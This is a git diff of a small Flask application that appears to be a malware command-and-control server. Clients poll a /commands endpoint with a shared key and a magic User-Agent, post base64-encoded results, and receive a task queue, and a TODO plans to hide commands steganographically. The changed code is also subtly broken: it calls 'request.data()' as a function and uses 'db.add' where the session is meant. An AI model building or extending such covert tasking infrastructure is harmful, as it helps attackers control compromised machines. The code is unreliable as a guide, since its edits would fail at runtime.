@@ -104,11 +104,11 @@ def request_loader(request):
 @app.route('/home')
 @flask_login.login_required
 def home():
+    get_commands = Command.query.all()
     if len(Results.query.all()) == 0:
-        return render_template('index.html', returns=' \n ', name=flask_login.current_user.id)
+        return render_template('index.html', returns=' \n ', commands=get_commands, name=flask_login.current_user.id)
     else:
         get_returns = Results.query.order_by(desc(Results.id))
-        get_commands = Command.query.all()
         if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
             return render_template('index.html',
                                    returns=get_returns[0].results,
@@ -133,21 +133,22 @@ def register():
 
 @app.route('/commands')
 def getCommand():
-    secretkey = request.args.get('key')
+    secretKey = request.args.get('Authorization')
     guid = request.args.get('guid')
-    if secretkey == password:
-        result = request.headers.get('User-Agent').split('|')
-        if len(result) >= 2:
-            result_command = base64.b64decode(result[1]).decode('utf-8')
-            id_command = result[2].split(',')[0]
+    if secretKey == password:
+        userAgent = request.headers.get('User-Agent')
+        if userAgent == "Myles920":
+            result = request.data()
+            result_data = base64.b64decode(result).decode('utf-8')
 
-            save_results = Results(results=result_command)
-            db.session.add(save_results)
-            command_done = \
-                Command.query.filter_by(id=int(id_command)).first()
-            command_done.done = not command_done.done
+            new_results = Results(results=result_data)
+            db.add(new_results)
+            # TODO CHANGE THE 'DONE' STATUS OF THE COMMAND TO TRUE, SINCE WE RECEIVED THE RESPONSE
+
             db.session.commit()
         task_queue = Command.query.all()
+        # TODO CONVERT THESE COMMANDS TO STEGA PICTURES AND STORE THEM IN A FILE? OR MAKE A LIST
+
         return render_template('commands.html', task_queue=task_queue)
     else:
         return render_template('redir.html')
